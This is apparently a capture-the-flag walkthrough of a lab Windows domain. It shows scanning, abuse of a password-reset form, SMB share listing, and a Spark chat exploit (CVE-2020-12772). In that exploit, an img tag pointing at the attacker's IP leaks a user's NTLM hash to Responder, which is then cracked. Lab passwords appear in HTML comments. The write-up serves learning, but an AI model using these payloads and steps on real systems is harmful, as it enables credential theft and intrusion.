# RA
You have found WindCorp's internal network and their Domain Controller. Can you pwn their network?

## Services discovery

    rustscan -a 10.10.223.246 -b 900
    ...
    PORT      STATE SERVICE          REASON
    53/tcp    open  domain           syn-ack ttl 127
    80/tcp    open  http             syn-ack ttl 127
    88/tcp    open  kerberos-sec     syn-ack ttl 127
    135/tcp   open  msrpc            syn-ack ttl 127
    139/tcp   open  netbios-ssn      syn-ack ttl 127
    389/tcp   open  ldap             syn-ack ttl 127
    445/tcp   open  microsoft-ds     syn-ack ttl 127
    464/tcp   open  kpasswd5         syn-ack ttl 127
    593/tcp   open  http-rpc-epmap   syn-ack ttl 127
    636/tcp   open  ldapssl          syn-ack ttl 127
    2179/tcp  open  vmrdp            syn-ack ttl 127
    3268/tcp  open  globalcatLDAP    syn-ack ttl 127
    3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
    3389/tcp  open  ms-wbt-server    syn-ack ttl 127
    5222/tcp  open  xmpp-client      syn-ack ttl 127
    5223/tcp  open  hpvirtgrp        syn-ack ttl 127
    5229/tcp  open  jaxflow          syn-ack ttl 127
    5985/tcp  open  wsman            syn-ack ttl 127
    7443/tcp  open  oracleas-https   syn-ack ttl 127
    7777/tcp  open  cbt              syn-ack ttl 127
    9090/tcp  open  zeus-admin       syn-ack ttl 127
    9091/tcp  open  xmltec-xmlmail   syn-ack ttl 127
    9389/tcp  open  adws             syn-ack ttl 127
    49668/tcp open  unknown          syn-ack ttl 127
    49672/tcp open  unknown          syn-ack ttl 127
    49673/tcp open  unknown          syn-ack ttl 127
    49674/tcp open  unknown          syn-ack ttl 127
    49693/tcp open  unknown          syn-ack ttl 127

We got quite a lot of services. Let's start to fingerprint main services:

    nmap -sVC -p 53,80,135,139,445,3389,5222 10.10.223.246 -Pn
    ...
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Windcorp.
    |_http-server-header: Microsoft-IIS/10.0
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    |_ssl-date: 2024-06-27T12:13:24+00:00; +1s from scanner time.
    | rdp-ntlm-info: 
    |   Target_Name: WINDCORP
    |   NetBIOS_Domain_Name: WINDCORP
    |   NetBIOS_Computer_Name: FIRE
    |   DNS_Domain_Name: windcorp.thm
    |   DNS_Computer_Name: Fire.windcorp.thm
    |   DNS_Tree_Name: windcorp.thm
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-06-27T12:12:44+00:00
    | ssl-cert: Subject: commonName=Fire.windcorp.thm
    | Not valid before: 2024-06-26T11:54:52
    |_Not valid after:  2024-12-26T11:54:52
    
    5222/tcp open  jabber
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Not valid before: 2020-05-01T08:39:00
    |_Not valid after:  2025-04-30T08:39:00
    |_ssl-date: 2024-06-27T12:34:18+00:00; +2s from scanner time.
    | fingerprint-strings: 
    |   RPCCheck: 
    |_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     unknown: 
    |     errors: 
    |       invalid-namespace
    |       (timeout)
    |     capabilities: 
    |     auth_mechanisms: 
    |     compression_methods: 
    |     features: 
    |     stream_id: 289u5utxdb
    |     xmpp: 
    |_    version: 1.0
    ...
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-time: 
    |   date: 2024-06-27T12:12:45
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required

We can notice that SMB is version 3 and that signing is also required, it implies that NTLM realy attack are not possible. We also find the FQDN for the server (fire.windcorp.thm).
First we can inspect the web site, since some images are not loaded correctly due to the fact that the hostname cannot be resolved, let's add the entry to the file host.
Navigating the site we can see that the IM client used is [Spark](https://www.igniterealtime.org/projects/spark). Using searchspolit to find some exploits but I found nothing, but searching the web I hit the following vulnerability: [CVE-2020-12772](https://nvd.nist.gov/vuln/detail/CVE-2020-12772), that actually it was discovered during the creation of this box by the authors. The version affected is 2.8.3 (and the ROAR plugin for it) on Windows. Anyway we need a valid user account to try to exploi this vulnerability, so at the moment is unusable. Going on with discovery actvities I tested the search function that actually does nothing, since the form does not perform any action. Indeed the change password form return the following response. Inspecting the workflow in Burp:

    -->
    POST /check.asp HTTP/1.1
    ...
    username=admin&question=1&secret=Rossi

    <--
    HTTP/1.1 200 OK
    ...
    <h1 class='display-4'>Wrong username and/or secret!</h1>
    ...

Interesting enough if we change the request method we got the same response:

    GET /check.asp?username=admin&question=1&secret=Rossi HTTP/1.1
    ...
Tried the request without passing any parameters, but I got the same response again.
Then I proceeded to fuzz the web application in order to find other resources

    gobuster dir -u http://fire.windcorp.thm -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt
    ...
    Starting gobuster in directory enumeration mode
    ===============================================================
    /check.asp            (Status: 200) [Size: 971]
    /??? Admin_list.asp   (Status: 400) [Size: 311]
    /??? Vote_List.asp    (Status: 400) [Size: 311]
    /Reset.asp            (Status: 200) [Size: 1598]

Even directory bruteforcing does not return any interesting results. Then I decided to check if there are any shares that we can access as anonymous:

    smbmap -H 10.10.223.246                                   
But does not return anything. At this point we have to work around the reset password functionality to get a foothold on the server. Since one of the question is to reset the password is 

    What is/was your favorite pets name?

On the site home page there is the picture of Lily Levesque with a dog, inspecting the image we got:

    <img class="img-fluid rounded-circle mb-3" src="img/lilyleAndSparky.jpg" alt="">

So we can try to send use lily as username and sparky as pets name, but again we got: 
Wrong username and/or secret! Let's try with lilyle as username. Again it didn't work, then I tried with lilyle\Sparky. This time the password was reset to a new value, returned in the response.
<!-- lilyle\ChangeMe#1234 -->
Now having these credentials I tried to access the shared folders (NOTE: the server IP address is changed from now on):

    smbmap -u lilyle -p 'XXXXXX#nnnn' -H 10.10.9.146 
    ....
    [+] IP: 10.10.9.146:445 Name: fire.windcorp.thm         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

I started to list the content of the Shared folder:

    smbclient '\\10.10.9.146\shared' -U lilyle --password ChangeMe#1234 -t 120
    ...
    smb: \> ls
      .                                   D        0  Sat May 30 02:45:42 2020
      ..                                  D        0  Sat May 30 02:45:42 2020
      Flag 1.txt                          A       45  Fri May  1 17:32:36 2020
      spark_2_8_3.deb                     A 29526628  Sat May 30 02:45:01 2020
      spark_2_8_3.dmg                     A 99555201  Sun May  3 13:06:58 2020
      spark_2_8_3.exe                     A 78765568  Sun May  3 13:05:56 2020
      spark_2_8_3.tar.gz                  A 123216290  Sun May  3 13:07:24 2020

Here we can get the vulnerable client to install into the attacker machine to try to exploit CVE-2020-12772, that seems the way to get access to the machine.  

Since the client is an old application, I got some problems to run it on my attacker machine (kali 2024.2). The more convinient way I found was to install it using wine32. Since we are going to install a bunch of packages that probably you want use anymore once completed the lab, if your attacker machine is a VM,  I suggest to take a snapshot before to install the whole stuff, to revert it once completed the lab. Anyway at the end of the section you will find the instructions to remove wine completely.
Let's proceed to install wine and the support for 32bit arch, since the client app is 32bit application

     sudo apt install wine 
     sudo dpkg --add-architecture i386
     sudo apt update
     sudo apt install wine32

Now we can proceed to downlod the exe from the shared (it takes a while, remember to add the -t option to specify the timeout):

    smbclient '//10.10.9.146/shared' -U lilyle@windcorp.thm -t 120
    ...
    smb: \> get spark_2_8_3.exe
    getting file \spark_2_8_3.exe of size 78765568 as spark_2_8_3.exe (2015.3 KiloBytes/sec) (average 2015.3 KiloBytes/sec)

Now proceed to install the application and executed. Once the client is started you have to set up the following parameters to connect to the server:

    wine spark_2_8_3.exe 
    ...
    Preparing JRE ...
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

In the setup windows click next four times. Once the setup is finished the login window will appear (wait 10 seconds or more, ignore the error: 0144:err:ole:CoUninitialize Mismatched CoUninitialize). Here we have to configure some parameters to connect to the server in the Advanced connection preferences (click the button in the center bottom of the login window):
- Uncheck the automatic discover host and port
- In the connection box set the host to the IP server of the lab
- Leave the default port
- Select accept all the certificates
- Select Disable certificate hostname verification
Click Ok to come back to the credential login input. Here insert lilyle credentials and windcorp.thm as domain and click Login.

Once logged in, checking the web site home page, it seems that the only online user is <b>buse</b>, so we have to send our payload to him. In the Lyle user window, in the bottom, search for buse. In the results windows double click to the name to open the chat. Before to send our payload let's start Responder:

    sudo responder -I tun0
    ...
    [+] Listening for events...                                                                                                                                                                                                              
Now in the chat windows send the following payload to buse

    Have a look at me at the beach with my new bikini
    <img src="http://10.9.1.97/lily_on_the_beach.jpg">


After a while we will get buse's hash:

    [HTTP] NTLMv2 Client   : 10.10.9.146
    [HTTP] NTLMv2 Username : WINDCORP\buse
    [HTTP] NTLMv2 Hash     : buse::WINDCORP:ab702f1448174896:312957EE0E14C19E1AC7C13952DD48ED:........0000000                                                          [*] Skipping previously captured hash for WINDCORP\buse

Then we can try to reverse the hashed value:

    sudo hashcat -m 5600 -a 0 buse_hash  /usr/share/wordlists/rockyou.txt
    ...
    BUSE::WINDCORP:ab702f1448174896:312957ee0e14c19e1ac7c13952dd48ed:0101000000000000975ac41db2cbda019ecbdaf1a4988ec70000000002000800550039004b00480001001e00570049004e002d00330043005a0042004400440045004c00510048005a0004001400550039004b0048002e004c004f00430041004c0003003400570049004e002d00330043005a0042004400440045004c00510048005a002e00550039004b0048002e004c004f00430041004c0005001400550039004b0048002e004c004f00430041004c00080030003000000000000000010000000020000016f228859c52c2f32d06d45262dc1d34230fca797c76e1510cf119ebcb67d8950a00100000000000000000000000000000000000090000000000000000000000:xxxxxxx
                                                          
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 5600 (NetNTLMv2)

<!-- buse\uzunLM+3131 -->
  


    

  


  

    
